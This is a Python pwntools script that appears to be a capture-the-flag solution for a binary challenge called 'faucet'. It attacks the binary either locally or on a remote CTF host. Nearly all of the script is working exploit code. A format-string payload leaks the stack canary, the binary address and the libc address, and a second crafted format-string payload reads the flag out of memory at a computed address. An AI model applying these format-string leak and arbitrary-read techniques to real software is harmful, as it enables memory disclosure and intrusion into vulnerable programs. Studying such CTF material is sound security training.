#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import time
import binascii

context.update(arch='amd64')
exe = './faucet'
elf = ELF(exe)
HOST = 'challenge.ctf.games'
PORT = 31789

if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF("./libc6_2.31-0ubuntu5_amd64.so") 

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(HOST,PORT)
    else:
        return process([exe] + argv, *a, **kw)

# $ python3 solve.py DEBUG GDB NOASLR
gdbscript = '''
b main
c
'''.format(**locals())

p = start()
p.recvuntil(b"sinks\n")
p.recvuntil(b">")
p.sendline(b"5")
p.recvuntil(b"?:")

leak_payload = b"%11$lx %13$lx %17$lx"
p.sendline(leak_payload)
canary, bin_leak, libc_leak = p.recvline().decode('utf-8').split()[4:8]
if args.REMOTE:
    libc.address = int(libc_leak,16) - 0x0270b3
else: 
    libc.address = int(libc_leak,16) - 0x028cb2
bin_base = int(bin_leak,16) - 0x1725
flag_addr = bin_base + 0x4060
log.info(f"binary base: {hex(bin_base)}")
log.info(f"flag addr @ {hex(flag_addr)}")

p.recvuntil(b">")
p.sendline(b"5")
p.recvuntil(b"?:")

payload = b"%8$8s "
payload += b"\x00"*10
payload += p64(flag_addr)
payload += b"\x00\x00\x00"
p.sendline(payload)
print(p.recvuntil(b"}"))
